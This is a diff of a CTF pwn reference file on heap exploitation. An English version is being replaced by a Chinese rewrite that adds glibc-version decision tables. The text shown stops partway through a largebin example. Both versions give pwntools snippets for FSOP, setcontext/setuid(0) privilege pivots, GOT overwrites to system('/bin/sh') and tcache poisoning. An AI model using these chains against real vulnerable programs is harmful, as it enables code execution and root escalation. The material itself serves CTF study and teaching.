@@ -1,1081 +1,436 @@
-# CTF Pwn - Heap Techniques
-
-## Table of Contents
-- [House of Apple 2 — FSOP for glibc 2.34+ (0xFun 2026)](#house-of-apple-2--fsop-for-glibc-234-0xfun-2026)
-  - [setcontext Variant for SUID Binaries (Midnight Flag 2026)](#setcontext-variant-for-suid-binaries-midnight-flag-2026)
-- [House of Einherjar — Off-by-One Null Byte (0xFun 2026)](#house-of-einherjar--off-by-one-null-byte-0xfun-2026)
-- [Heap Exploitation](#heap-exploitation)
-  - [Heap Grooming via Application Operations (Codegate 2013)](#heap-grooming-via-application-operations-codegate-2013)
-- [Custom Allocator Exploitation](#custom-allocator-exploitation)
-  - [talloc Pool Header Forgery for Arbitrary Read/Write (Boston Key Party 2016)](#talloc-pool-header-forgery-for-arbitrary-readwrite-boston-key-party-2016)
-- [Classic Heap Unlink Attack (Crypto-Cat)](#classic-heap-unlink-attack-crypto-cat)
-- [musl libc Heap Exploitation — Meta Pointer + atexit (UNbreakable 2026)](#musl-libc-heap-exploitation--meta-pointer--atexit-unbreakable-2026)
-- [House of Orange](#house-of-orange)
-- [House of Spirit](#house-of-spirit)
-- [House of Lore](#house-of-lore)
-- [House of Force (CSAW CTF 2016)](#house-of-force-csaw-ctf-2016)
-- [tcache Stashing Unlink Attack](#tcache-stashing-unlink-attack)
-- [Unsafe Unlink to BSS + Top Chunk Consolidation (SECCON 2016)](#unsafe-unlink-to-bss--top-chunk-consolidation-seccon-2016)
-- [Largebin Attack — Dedicated Technique (TravelGraph / Setjmp 2024)](#largebin-attack--dedicated-technique-travelgraph--setjmp-2024)
-- [tcache 2.39 Changes — Key, Count, and calloc](#tcache-239-changes--key-count-and-calloc)
-- [House of Tangerine — tcache Count + Unsorted Bin Variant](#house-of-tangerine--tcache-count--unsorted-bin-variant)
-
-For CTF-specific UAF, tcache, and custom-allocator writeup variants — UAF vtable pointer encoding, uninitialized chunk residue leak, tcache strcpy null-byte overflow, adjacent-struct fn-pointer overflow, hidden menu tcache poisoning, tcache double-free stdout hijack, tcache-to-fastbin promotion, 6-bit OOB accumulator, IS_MMAPED bit-flip, filename-regex LSB fastbin, and custom-allocator unsafe unlink — see [heap-techniques.md](#part-2).
-
-For FILE-structure (_IO_FILE) exploitation — fastbin stdout vtable hijack, _IO_buf_base null-byte overwrite, glibc 2.24+ vtable validation bypass, unsorted-bin attacks on stdin FILE fields, realloc-as-free UAF, and refcount wraparound — see [[binary/漏洞利用/heap-fsop.md|heap-fsop.md]].
-
 ---
 
-## House of Apple 2 — FSOP for glibc 2.34+ (0xFun 2026)
+phase: binary
+vuln_class: [pwn, heap, tcache, fastbin, largebin, fsop, unlink, custom-allocator]
+title: 堆利用
+summary: 先看 glibc 版本和手上是哪种原语，再查「能往哪个 bin 塞、能从哪个 bin 取」。判据是溢出能改到谁的元数据，以及目标槽位属于哪条分配路径。
+---
 
-**When to use:** Modern glibc (2.34+) removed `__free_hook`/`__malloc_hook`. House of Apple 2 uses FSOP via `_IO_wfile_jumps`.
+# 堆利用
 
-**Full chain:** UAF → leak libc (unsorted bin fd/bk) → leak heap (safe-linking mangled NULL) → tcache poisoning to `_IO_list_all` → fake FILE → exit triggers shell.
+FILE 结构体（`_IO_FILE`）专项见 [[binary/漏洞利用/heap-fsop.md|FILE 结构体]]；原语查表见 [[binary/漏洞利用/field-notes.md|原语速查表]]；栈溢出见 [[binary/漏洞利用/overflow-basics.md|栈与基础溢出]]。
 
-**Fake FILE structure requirements:**
+## 0. 判据速查
+
+| 手上的原语 / 现状 | 首选手法 | 去哪节 |
+|---|---|---|
+| 有 UAF + 能改 freed 块的 `fd` | tcache poisoning（2.26+，注意 safe-linking） | §1 |
+| glibc ≥ 2.34，hooks 已被移除 | House of Apple 2（FSOP 走 `_IO_wfile_jumps`） | §2 |
+| SUID 二进制，`system("/bin/sh")` 不起作用 | `setcontext` 枢轴 → 先 `setuid(0)` | §2.1 |
+| off-by-one null 打 `malloc_usable_size` 边界 | House of Einherjar | §3 |
+| 没有 delete/free 功能 | House of Orange（改 top 逼 `sysmalloc` 释放） | §4 |
+| 能伪造块地址并让它被 `free()` | House of Spirit | §5 |
+| 能改 freed smallbin 块的 `bk` | House of Lore | §6 |
+| 能改 top chunk 的 `size`（glibc < 2.29） | House of Force | §7 |
+| tcache 未满 + 有 smallbin | tcache stashing unlink | §8 |
+| 只能改 largebin 的 `bk_nextsize` | largebin attack（2.32+ safe-linking 不管它） | §9 |
+| glibc 2.39（Ubuntu 24.04） | key 在 +0x08、count 上限 7、`calloc` 也走 tcache | §10 |
+| tcache count 可改 + 有 unsorted 块 | House of Tangerine | §11 |
+| 目标是 musl libc | `meta->mem` 重定向 + `atexit` | §12 |
+| 程序用 talloc / nginx pool / apr | 伪造 pool 头让下次分配落到任意地址 | §13 |
+| 老 glibc（< 2.26）无 tcache | 经典 unsafe unlink | §14 |
+| 分配预算极少（只有 2 次） | tcache→fastbin 跨 bin 提升 | §15 |
+| 菜单有未文档化选项 | 先翻菜单解析器，常见 `1337`/`9999` | §16 |
+| 溢出要过字符集过滤 | 只改堆指针的 LSB（同一 256 字节窗内搬移） | §17 |
+| `calloc` 的零化挡住了泄漏 | 翻 `IS_MMAPPED` 位让 `calloc` 跳过 `memset` | §18 |
+| OOB 写只按 QWORD 对齐，目标只差几十字节 | 找同结构体里按固定步长自增的计数器当算术垫片 | §19 |
+| 未初始化字段 + 块复用 | 堆残渣泄漏 | §20 |
+| C++ 对象 UAF，`this` 被当第一参数 | 让指针值本身解码成 `"sh"` | §21 |
+| cgo/Go 服务里有 C 风格结构体 | 名字缓冲区溢出到相邻函数指针 | §22 |
+| 自定义分配器 | 逆元数据布局 + 找析构回调 | §23 |
+
+**glibc 版本决定一切**：
+
+| 版本 | 关键变化 |
+|---|---|
+| `< 2.26` | 无 tcache，unlink 有 safe-unlink 检查 |
+| `2.26+` | 引入 tcache，`__free_hook` 可用 |
+| `2.29+` | tcache key 校验（double free 检测）；top chunk size 校验（House of Force 失效） |
+| `2.31+` | 移除 `__malloc_hook`/`__free_hook` 之外的 hooks 路径收窄，转向 FSOP |
+| `2.32+` | tcache `fd` safe-linking：`fd = ptr ^ (chunk_addr >> 12)` |
+| `2.34+` | 彻底移除 `__free_hook`/`__malloc_hook`，只能 FSOP 或返回地址 |
+| `2.39` | tcache `key` 在 `+0x08`、`counts` 为 `char` 上限 7、`calloc` 也走 tcache |
+
+## 1. tcache poisoning 与 safe-linking
+
 ```python
-fake_file = flat({
-    0x00: b' sh\x00',           # _flags = " sh\x00" (fp starts with " sh")
-    0x20: p64(0),                # _IO_write_base = 0
-    0x28: p64(1),                # _IO_write_ptr = 1 (> _IO_write_base)
-    0x88: p64(heap_addr),        # _lock (valid writable address)
-    0xa0: p64(wide_data_addr),   # _wide_data pointer
-    0xd8: p64(io_wfile_jumps),   # vtable = _IO_wfile_jumps
-}, filler=b'\x00')
-
-fake_wide_data = flat({
-    0x18: p64(0),                # _IO_write_base = 0
-    0x30: p64(0),                # _IO_buf_base = 0
-    0xe0: p64(fake_wide_vtable), # _wide_vtable
-})
-
-fake_wide_vtable = flat({
-    0x68: p64(libc.sym.system),  # __doallocate offset
-})
-```
-
-**Trigger chain:** `exit()` → `_IO_flush_all_lockp` → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `_IO_WDOALLOCATE(fp)` → `system(fp)` where fp = `" sh\x00..."`.
-
-**Safe-linking (glibc 2.32+):** tcache fd pointers are mangled: `fd = ptr ^ (chunk_addr >> 12)`. To poison tcache:
-```python
-# When writing to freed chunk, mangle the target address:
+# 2.32+ 写入 freed 块的 fd 时必须混淆
 mangled_fd = target_addr ^ (current_chunk_addr >> 12)
 ```
 
-### setcontext Variant for SUID Binaries (Midnight Flag 2026)
+`PROTECT_PTR(pos, ptr) = ptr ^ (pos >> 12)`。**忘记混淆的症状是 malloc 返回一个明显不对的地址然后崩**，不是「没生效」。
 
-When exploiting SUID-root binaries, `system("/bin/sh")` fails because dash drops privileges when `uid != euid`. Replace the `system(fp)` target with `setcontext(fp)` to pivot to a ROP chain that calls `setuid(0)` first:
+泄漏 heap 基址的常用手法：tcache 第一个 freed 块的 `fd` 是 `NULL ^ (chunk >> 12)`，也就是 `chunk >> 12`——**它本身就是 heap 地址的高位**。
 
-```python
-# Wide vtable targets setcontext instead of system
-fake_wide_vtable = flat({
-    0x68: p64(libc.sym.setcontext + 61),  # __doallocate → setcontext
-})
+## 2. House of Apple 2（glibc 2.34+）
 
-# setcontext loads registers from the ucontext struct it is called with:
-#   glibc >= 2.29: ucontext pointer in RDI (fp->_wide_data when reached via
-#     _IO_wdoallocbuf) — RSP from [rdi+0xa0], RIP from [rdi+0xa8],
-#     RDI (first argument) from [rdi+0x68].
-#   glibc <= 2.28: registers were loaded relative to RDX instead
-#     (RSP from [rdx+0xa0], RIP from [rdx+0xa8], RDI from [rdx+0x68]).
-# Place ROP chain at _wide_data structure:
-fake_wide_data = flat({
-    0x18: p64(0),                     # _IO_write_base = 0
-    0x30: p64(0),                     # _IO_buf_base = 0
-    0x68: p64(0),                     # RDI = 0 (for setuid(0))
-    0xa0: p64(rop_chain_addr),        # RSP = pivot to ROP chain
-    0xa8: p64(libc.sym.setuid),       # RIP = setuid as first call
-    0xe0: p64(fake_wide_vtable_addr), # _wide_vtable
-})
+2.34 之后 hooks 全没了，只能走 FSOP。
 
-# ROP chain at rop_chain_addr:
-rop = flat([
-    pop_rdi_ret,
-    libc.address + 0,               # After setuid(0) returns here
-    # ... additional setup ...
-    libc.sym.system,
-    next(libc.search(b"/bin/sh\x00")),
-])
-```
-
-**Trigger chain:** `exit()` → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `setcontext(fp)` → stack pivot → `setuid(0)` → `system("/bin/sh")`.
-
-**Key insight:** `setcontext` is a universal stack pivot gadget — it loads RSP, RDI, and RIP from controlled memory, enabling arbitrary ROP execution from a FILE-based exploit. Essential for SUID binaries where dash enforces `uid == euid`.
-
----
-
-## House of Einherjar — Off-by-One Null Byte (0xFun 2026)
-
-**Vulnerability:** Off-by-one NUL at end of `malloc_usable_size` clears `PREV_INUSE` of next chunk.
-
-**Exploit chain:**
-1. Set `prev_size` of next chunk to create fake backward consolidation
-2. Forge largebin-style chunk with `fd/bk` AND `fd_nextsize/bk_nextsize` all pointing to self (passes `unlink_chunk()`)
-3. After consolidation, overlapping chunks enable tcache poisoning
-4. Overwrite `stdout` or `_IO_list_all` for FSOP
-
-**Key requirement:** Self-pointing unlink trick is essential. The fake chunk must pass `unlink_chunk()` which checks `FD->bk == P && BK->fd == P` and (for large chunks) `fd_nextsize->bk_nextsize == P && bk_nextsize->fd_nextsize == P`:
+完整链：UAF → 泄 libc（unsorted 的 fd/bk）→ 泄 heap（safe-linking 混淆过的 NULL）→ tcache 打到 `_IO_list_all` → 假 FILE → `exit()` 触发。
 
 ```python
-# Fake chunk layout (at known heap address fake_addr):
-#   chunk header:
-#     prev_size:      don't care
-#     size:           target_size | PREV_INUSE  (must match consolidation math)
-#     fd:             fake_addr   (self-referencing)
-#     bk:             fake_addr   (self-referencing)
-#     fd_nextsize:    fake_addr   (self-referencing, needed for large chunks)
-#     bk_nextsize:    fake_addr   (self-referencing)
-
-fake_chunk = flat({
-    0x00: p64(0),                # prev_size
-    0x08: p64(target_size | 1),  # size with PREV_INUSE set
-    0x10: p64(fake_addr),        # fd -> self
-    0x18: p64(fake_addr),        # bk -> self
-    0x20: p64(fake_addr),        # fd_nextsize -> self
-    0x28: p64(fake_addr),        # bk_nextsize -> self
+fake_file = flat({
+    0x00: b' sh\x00',           # _flags 直接就是命令串（fp 从 " sh" 开始）
+    0x20: p64(0),                # _IO_write_base = 0
+    0x28: p64(1),                # _IO_write_ptr = 1（必须 > write_base）
+    0x88: p64(heap_addr),        # _lock 必须指向可写地址
+    0xa0: p64(wide_data_addr),   # _wide_data
+    0xd8: p64(io_wfile_jumps),   # vtable
 }, filler=b'\x00')
 
-# Victim chunk's prev_size must equal distance from fake_chunk to victim
-# Off-by-one NUL clears victim's PREV_INUSE bit
-# free(victim) triggers backward consolidation: merges with fake_chunk
-# Result: consolidated chunk overlaps other live allocations
-```
-
-**Setup sequence:**
-1. Allocate chunks A (large, will hold fake chunk), B (filler), C (victim with off-by-one)
-2. Write fake chunk into A with self-referencing pointers
-3. Trigger off-by-one on C to clear B's PREV_INUSE and set B's prev_size
-4. Free B → consolidates backward into A → overlapping chunk
-5. Allocate over the overlap region to control other live chunks
-
----
-
-## Heap Exploitation
-
-- tcache poisoning (glibc 2.26+)
-- fastbin dup / double free
-- House of Force (old glibc)
-- Unsorted bin attack
-- Check glibc version: `strings libc.so.6 | grep GLIBC`
-
-**Heap info leaks via uninitialized memory:**
-- Error messages outputting user data may include freed chunk metadata
-- Freed chunks contain libc pointers (fd/bk in unsorted bin)
-- Missing null-termination in sprintf/strcpy leaks adjacent memory
-- Trigger error conditions to leak libc/heap base addresses
-
-**Heap feng shui:**
-- Arrange heap layout by controlling allocation order/sizes
-- Create holes of specific sizes by allocating then freeing
-- Place target structures adjacent to overflow source
-- Use spray patterns with incremental offsets (e.g., 0x200 steps)
-
-### Heap Grooming via Application Operations (Codegate 2013)
-
-**Pattern:** Multi-step application-level operations (create/reply/delete in a board, forum, or note app) to achieve controlled heap state for exploitation.
-
-**Technique:**
-1. Create N entries with overflow payloads in author/title/content fields
-2. Fill reply buffers for each entry (e.g., 127 replies of `"sh"`) to place controlled data at predictable heap locations
-3. Selectively delete entries to create specific heap holes
-4. Allocate new entries that land in freed chunks, overlapping with surviving metadata
-
-```python
-# Example: Codegate 2013 Vuln 400 — board-based heap grooming
-# Step 1: Create 7 posts with overflow in content field
-for i in range(7):
-    create_post("YOLO", "YOLO",
-        "A" * 36 + pack("I", got_addr) +    # Author overflow
-        "A" * 604 + pack("I", got_addr) +    # Content overflow
-        pack("I", plt_addr) * 80)            # Spray GOT targets
-
-# Step 2: Fill reply buffers to heap-spray "sh" strings
-for i in range(7):
-    for j in range(127):
-        reply_to_post(i, "sh")
-
-# Step 3: Delete 5 of 7 to create specific heap holes
-for i in [0, 1, 2, 3, 4]:
-    delete_post(i)
-
-# Step 4: Allocate 2 new entries into freed space
-create_post(payload_a, payload_b, payload_c)
-create_post(payload_d, payload_e, payload_f)
-
-# Step 5: Trigger via modify + delete sequence
-modify_post(target_id, trigger_payload)
-delete_post(target_id)  # Triggers GOT overwrite → shell
-```
-
-**Key insight:** Application operations (create, reply, delete, modify) map to heap allocations and frees of predictable sizes. By controlling the sequence and count of operations, you achieve the same effect as direct heap manipulation but through the application's own interface.
-
-## Custom Allocator Exploitation
-
-Applications may use custom allocators (nginx pools, Apache apr, game engines):
-
-**nginx pool structure:**
-- Pools chain allocations with destructor callbacks
-- `ngx_destroy_pool()` iterates cleanup handlers
-- Overflow to overwrite destructor function pointer + argument
-- When pool freed, calls `system(controlled_string)`
-
-**General approach:**
-1. Reverse engineer allocator metadata layout
-2. Find destructor/callback pointers in structures
-3. Overflow to corrupt pointer + first argument
-4. Trigger deallocation to call controlled function
-
-```python
-# nginx pool exploit pattern
-payload = flat({
-    0x00: cmd * (0x800 // len(cmd)),      # Command string
-    0x800: [libc.sym.system, HEAP + OFF] * 0x80,  # Destructor spray
-    0x1010: [0x1020, 0x1011],              # Pool metadata
-    0x1010+0x50: [HEAP + OFF + 0x800]      # Cleanup handler ptr
-}, length=0x1200)
-```
-
-### talloc Pool Header Forgery for Arbitrary Read/Write (Boston Key Party 2016)
-
-**Pattern:** talloc is a hierarchical memory allocator (used in Samba, CUPS, etc.). Forge fake pool headers with controlled fields to redirect allocations to arbitrary addresses.
-
-```c
-// talloc pool header fields: end, object_count, hdr_fill
-// followed by talloc_chunk: next, prev, parent, child, refs, name, size, flags, pool
-// Set pool boundaries to span target address
-// Next allocation returns attacker-controlled address
-// Read GOT for libc leak, write __free_hook with system()
-```
-
-**Exploitation steps:**
-1. Leak heap address through application data
-2. Forge talloc pool header with `end` pointing past target address
-3. Next `talloc()` call returns memory at attacker-chosen location
-4. Use arbitrary read (GOT) for libc leak, arbitrary write for hook overwrite
-
-**Key insight:** Custom allocator pool metadata controls where future allocations land. When applications use talloc, pool header forgery provides arbitrary memory placement. The hierarchical parent/child structure means corrupting one header cascades through the allocation tree.
-
-**References:** Boston Key Party 2016
-
-## Classic Heap Unlink Attack (Crypto-Cat)
-
-**When to use:** Old glibc (< 2.26, no tcache) or educational heap challenges. Overflow one heap chunk's metadata to corrupt the next chunk's `prev_size` and `size` fields, then trigger an unlink during `free()` that writes an arbitrary value to an arbitrary address.
-
-**How dlmalloc unlink works:**
-```c
-// When free() consolidates with an adjacent free chunk:
-// FD = P->fd, BK = P->bk
-// FD->bk = BK    (write BK to FD + offset)
-// BK->fd = FD    (write FD to BK + offset)
-// This is a write-what-where primitive
-```
-
-**Exploit pattern:**
-1. Allocate two adjacent chunks (A and B)
-2. Overflow A's data into B's chunk header:
-   - Set B's `prev_size` to A's data size (fake "previous chunk is free")
-   - Clear B's `PREV_INUSE` bit in `size` field
-   - Craft fake `fd` and `bk` pointers in A's data area
-3. Free B → `free()` thinks A is also free, triggers backward consolidation → unlink on fake chunk
-
-```python
-from pwn import *
-
-# Fake chunk in A's data region
-fake_fd = target_addr - 0x18  # GOT entry - 3*sizeof(ptr)
-fake_bk = target_addr - 0x10  # GOT entry - 2*sizeof(ptr)
-
-# Overflow from A into B's header
-payload = p64(0)              # fake prev_size for A
-payload += p64(data_size)     # fake size for A (marks A as "free")
-payload += p64(fake_fd)       # fd pointer
-payload += p64(fake_bk)       # bk pointer
-payload += b'A' * (data_size - 32)  # fill A's data
-payload += p64(data_size)     # overwrite B's prev_size
-payload += p64(b_size & ~1)   # overwrite B's size, clear PREV_INUSE bit
-
-# After free(B): target_addr now contains a pointer we control
-```
-
-**Modern mitigations:** glibc 2.26+ added safe-unlinking checks (`FD->bk == P && BK->fd == P`). For modern heaps, use tcache poisoning, House of Apple 2, or House of Einherjar instead.
-
-**Key insight:** The unlink macro performs two pointer writes. By controlling `fd` and `bk` in a fake chunk, you get a constrained write-what-where: each location gets the other's value. Classic use: overwrite a GOT entry with the address of a win function or shellcode.
-
----
-
-## musl libc Heap Exploitation — Meta Pointer + atexit (UNbreakable 2026)
-
-**Pattern (atypical-heap):** Binary linked against musl libc (not glibc). musl's allocator uses `meta` structures instead of chunk headers. OOB read leaks `meta->mem` pointer; arbitrary write redirects allocation to controlled address.
-
-**musl allocator layout:**
-- Each allocation belongs to a `group`, managed by a `meta` struct
-- `meta->mem` points to the group's data region
-- First `0x70`-class allocation places `meta0->mem` at a fixed offset from PIE base (e.g., `chall_base + 0x3f20`)
-
-**Exploitation chain:**
-1. **Leak meta pointer** — OOB read at offset `0x80` from a heap allocation reads the `meta` struct pointer
-2. **Recover PIE base** — `meta0->mem` is at a fixed offset from the binary base
-3. **Redirect allocation** — Overwrite `meta->mem` to point at a live group or target address. Next allocation from that group returns attacker-controlled memory
-4. **atexit hijack** — Overwrite musl's `atexit` handler list with `system("cat flag")`. Normal program exit triggers code execution
-
-```python
-# Leak meta pointer via OOB read
-meta_ptr = leak_at_offset(0x80)
-pie_base = meta_ptr - 0x3f20  # fixed offset for first 0x70 allocation
-
-# Rewrite meta->mem to redirect future allocations
-write_at(meta_ptr + META_MEM_OFFSET, target_addr)
-
-# Next alloc returns target_addr — use to overwrite atexit handlers
-alloc_and_write(atexit_list_addr, system_addr, "cat flag")
-```
-
-**Key insight:** musl's allocator metadata (`meta` structs) is stored separately from heap data, but predictable offsets link them to the binary base. Unlike glibc, musl has no safe-linking or tcache — corrupting `meta->mem` gives direct allocation control. The `atexit` handler list is a simpler code execution target than glibc's `__free_hook` (which is removed in 2.34+).
-
-**Detection:** Binary uses musl libc (check `ldd`, or `strings binary | grep musl`). Menu-style heap challenges with read/write primitives.
-
----
-
-## House of Orange
-
-**Pattern:** Trigger unsorted bin allocation without calling `free()`. Overwrite the top chunk size to a small value via heap overflow. Next large allocation fails the top chunk, forces `sysmalloc` to free the old top chunk into unsorted bin. Then corrupt the freed chunk for FSOP or tcache attack.
-
-```python
-# Step 1: Overflow to corrupt top chunk size
-# Top chunk must have PREV_INUSE set and size aligned to page
-# Size must be < MINSIZE away from page boundary
-edit(0, b'A' * overflow_len + p64(0xc01))  # Fake small top chunk
-
-# Step 2: Request larger than corrupted top size
-# Forces sysmalloc → old top freed into unsorted bin
-add(0x1000, b'B')  # Triggers the free
-
-# Step 3: Unsorted bin attack or FSOP from here
-# Overwrite _IO_list_all via unsorted bin's bk pointer
-```
-
-**Key insight:** House of Orange creates a free chunk without ever calling `free()` — essential when the binary has no delete/free functionality. The corrupted top chunk size must satisfy: `(size & 0xFFF) == 0` (page-aligned end), `size >= MINSIZE`, and `PREV_INUSE` bit set.
-
-**Requirements:** Heap overflow that can reach top chunk metadata. glibc < 2.26 for classic variant; modern versions need FSOP chain (House of Apple 2).
-
----
-
-## House of Spirit
-
-**Pattern:** Forge a fake chunk in attacker-controlled memory (stack, .bss, or heap), then `free()` it to get it into a bin. Next allocation of that size returns the fake chunk, giving write access to the target area.
-
-```python
-# Forge fake fastbin chunk on the stack
-# Need valid size field and next chunk's size for validation
-fake_chunk = flat(
-    0,              # prev_size
-    0x41,           # size (0x40 + PREV_INUSE) — must match target fastbin
-    0, 0, 0, 0, 0, 0,  # data area (8 qwords for 0x40 chunk)
-    0,              # next chunk prev_size
-    0x41,           # next chunk size (passes free() validation)
-)
-
-# Write fake chunk address somewhere the binary will free()
-# e.g., overwrite a pointer that gets passed to free()
-overwrite_ptr(target_ptr, addr_of_fake_chunk + 0x10)
-
-# Trigger free(target_ptr) → fake chunk enters fastbin
-trigger_free()
-
-# Next malloc(0x38) returns our fake chunk → write to controlled area
-malloc_and_write(0x38, payload)
-```
-
-**Key insight:** The key constraint is that `free()` validates the size of the chunk AND the size of the "next" chunk (at `chunk + size`). Both must look valid — sizes in fastbin range (0x20-0x80 on 64-bit), with proper alignment and flags.
-
----
-
-## House of Lore
-
-**Pattern:** Corrupt a smallbin chunk's `bk` pointer to point to a fake chunk in attacker-controlled memory. When the smallbin is used for allocation, the fake chunk gets linked into the bin. A second allocation returns the fake chunk, giving arbitrary write.
-
-```python
-# Step 1: Free a chunk into smallbin (via unsorted bin → sorted)
-free(chunk_a)
-malloc(large_size)  # Forces sorting: chunk_a moves to smallbin
-
-# Step 2: Forge fake chunk in target area
-# fake->fd must point back to the real smallbin chunk
-# fake->bk must point to another valid-looking chunk (or same)
-fake = flat(
-    0, 0x91,                    # prev_size, size
-    addr_of_real_chunk,         # fd → points back to legitimate chunk
-    addr_of_fake2,              # bk → another fake or self
-)
-
-# Step 3: Overwrite chunk_a->bk to point to our fake chunk
-edit_freed_chunk(chunk_a, bk=addr_of_fake)
-
-# Step 4: Two allocations from this smallbin
-alloc1 = malloc(0x80)  # Returns chunk_a (legitimate)
-alloc2 = malloc(0x80)  # Returns our fake chunk → arbitrary write!
-```
-
-**Key insight:** Requires corrupting `bk` of a freed smallbin chunk. The fake chunk's `fd` must point back to a chunk whose `bk` points to the fake — glibc checks `victim->bk->fd == victim`. On older glibc this check is weaker.
-
----
-
-## House of Force (CSAW CTF 2016)
-
-**Pattern:** Overwrite the wilderness (top) chunk's size field with a large value (e.g., `0xffffffffffffffff`), then request a carefully calculated allocation to move the heap pointer to an arbitrary address (e.g., GOT table).
-
-```python
-from pwn import *
-
-elf = ELF('./target')
-libc = ELF('./libc.so.6')
-
-# Step 1: Overflow into top chunk header, set size to -1 (0xffffffffffffffff)
-add_card(-1, b'A' * 24 + p64(0xffffffffffffffff))
-
-# Step 2: Calculate distance from top chunk to target (e.g., GOT entry)
-# evil_size = target_address - current_top_chunk_ptr - metadata_size
-target = elf.got['strtol']
-evil_size = target - 16 - top_chunk_ptr
-
-# Step 3: Allocate evil_size to advance top chunk pointer to target
-add_card(evil_size - 25, b'')
-
-# Step 4: Next allocation overlaps the target - write desired value
-# Overwrite strtol@GOT with system() address
-add_card(100, p64(libc.symbols['system']))
-
-# Step 5: Trigger - next call to strtol(user_input) calls system(user_input)
-io.sendline(b'/bin/sh')
-```
-
-**Key insight:** House of Force requires: (1) overflow into the top chunk to control its size field, (2) a single malloc of attacker-controlled size to position the heap, (3) a subsequent allocation at the target address. Works on glibc < 2.29 where top chunk size validation was added.
-
----
-
-## tcache Stashing Unlink Attack
-
-**Pattern:** Exploit tcache's interaction with smallbin during `malloc()`. When tcache for a size is not full, `malloc()` from smallbin will "stash" remaining smallbin chunks into tcache. During stashing, the `bk` pointer is followed without full validation, allowing arbitrary address to be linked into tcache.
-
-```python
-# Setup: Need 7 chunks in tcache (to later drain) + 2 in smallbin
-# The 2nd smallbin chunk has corrupted bk → target address
-
-# Step 1: Fill tcache with 7 chunks, then free 2 more into smallbin
-for i in range(7):
-    free(tcache_chunks[i])
-# These two go to unsorted → smallbin after sorting
-free(smallbin_chunk_1)
-free(smallbin_chunk_2)
-malloc(large)  # Sort unsorted bin → chunks enter smallbin
-
-# Step 2: Drain tcache
-for i in range(7):
-    malloc(target_size)
-
-# Step 3: Corrupt smallbin_chunk_2->bk to point to (target_addr - 0x10)
-# target_addr - 0x10 because tcache stores user data pointer at chunk+0x10
-edit_after_free(smallbin_chunk_2, bk=target_addr - 0x10)
-
-# Step 4: Allocate from smallbin
-# malloc returns smallbin_chunk_1
-# Stashing mechanism follows bk chain:
-#   smallbin_chunk_2 gets stashed into tcache
-#   Then follows corrupted bk → target gets stashed into tcache too!
-malloc(target_size)
-
-# Step 5: Next two mallocs: first returns smallbin_chunk_2, second returns target
-malloc(target_size)  # Returns chunk_2
-malloc(target_size)  # Returns target_addr → arbitrary write!
-```
-
-**Key insight:** During stashing, glibc sets `bck->fd = bin` (where `bck = victim->bk`), effectively writing a main_arena pointer to `target_addr`. This is a powerful write-what-where primitive. The written value is a heap/libc address (not fully controlled), but it's enough to corrupt FILE structures, tcache metadata, or other heap state.
-
-**Requirements:** glibc 2.29+ (tcache + smallbin interaction). Ability to corrupt a freed smallbin chunk's `bk` pointer.
-
----
-
-## Unsafe Unlink to BSS + Top Chunk Consolidation (SECCON 2016)
-
-**Pattern:** After a classic unsafe unlink writes a self-referential pointer into a BSS note table, craft a second fake chunk in BSS whose size spans from the BSS address to the heap's top chunk: `size = (heap_top_addr - bss_fake_addr) | PREV_INUSE`. Freeing this fake chunk consolidates it with the top chunk, effectively relocating the heap's allocation base into BSS. Subsequent malloc calls return memory overlapping the global pointer table, granting arbitrary read/write.
-
-```python
-# Step 1: Unsafe unlink places self-pointer at bss_table[3]
-# Fake chunk: fd = &bss_table[3] - 0x18, bk = &bss_table[3] - 0x10
-add_memo(248, p64(0) + p64(0) + p64(bss_table + 0x100 + 8 - 24) +
-         p64(bss_table + 0x100 + 8 - 16) + b'A' * 208 + p64(prev_size))
-
-# Step 2: Fake BSS chunk with size spanning to top chunk
-fake_size = heap_base + 0x310 - bss_addr + 0x1  # | PREV_INUSE
-edit_memo(3, b'A' * (256-32) + p64(prev_size) + p64(fake_size) + b'A' * 15)
-delete_memo(1)  # consolidation moves top chunk to BSS
-
-# Step 3: malloc now returns BSS memory — overwrite global pointers
-add_memo(size, p64(environ_addr))  # write &environ into note slot
-# read_memo leaks stack address from environ
-```
-
-**Key insight:** Standard unsafe unlink gives a single write primitive. This variant extends it to full arbitrary read/write by weaponizing the top chunk consolidation: any subsequent `malloc` returns BSS-overlapping memory, turning one write into unlimited controlled allocations within the global data segment.
-
-## Largebin Attack — Dedicated Technique (TravelGraph / Setjmp 2024)
-
-**When to use:** glibc 2.30+ with heap overflow / UAF that can corrupt a largebin chunk's `bk`, `bk_nextsize`, or `fd_nextsize`. Variants abused in *TravelGraph (2024)* and *Setjmp (2024)* where tcache was full/isolated and only unsorted/largebin path was reachable.
-
-**Background — largebin structure:**
-```c
-// glibc malloc/malloc.c — malloc_chunk for large sizes (0x400+)
-struct malloc_chunk {
-    size_t      prev_size;
-    size_t      size;             // | PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA
-    struct malloc_chunk *fd;      // largebin doubly-linked list (insertion order)
-    struct malloc_chunk *bk;
-    struct malloc_chunk *fd_nextsize; // sorted by size (descending)
-    struct malloc_chunk *bk_nextsize;
-};
-// Each largebin index holds chunks of a size range, sorted largest→smallest via fd_nextsize.
-```
-
-**Safe-unlink checks for largebins (glibc ≥ 2.30):**
-```c
-// _int_free / unlink_chunk validation — large chunks must pass both:
-if (chunksize(P) != prev_size(next_chunk(P))) abort();
-if (FD->bk != P || BK->fd != P) abort();                          // fd/bk check
-if (FD_nextsize->bk_nextsize != P || BK_nextsize->fd_nextsize != P) abort(); // nextsize check
-```
-
-**bk_nextsize attack primitive:**
-
-During insertion of a new large chunk `victim` into a largebin where `victim->size` is not the largest:
-
-```c
-// malloc.c — insertion into largebin (simplified):
-if ((unsigned long)(size) < (unsigned long)chunksize_nomask(bck->bk_nextsize->...))) {
-    fwd = bck;
-    bck = bck->bk_nextsize;
-    fwd->bk_nextsize = bck->bk_nextsize; // arbitrary write if bck->bk_nextsize corrupted
-}
-```
-
-If attacker corrupts a freed largebin chunk's `bk_nextsize` to `target - 0x20`, the assignment `fwd->bk_nextsize = victim` writes `victim` (heap address) to `*(target)`. With a second insertion, attacker can also corrupt `bk` to write `main_arena` address to `target`.
-
-**Classic Largebin Attack Steps (with safe-unlink bypass):**
-
-```python
-from pwn import *
-
-# 1. Allocate 2 large chunks (>0x400) that land in same largebin range
-#    and a guard chunk to prevent consolidation.
-a = malloc(0x428)  # A  -> will be freed to unsorted → largebin
-b = malloc(0x428)  # B  -> second largebin chunk (size differs by 0x10 to trigger branch)
-guard = malloc(0x28)
-
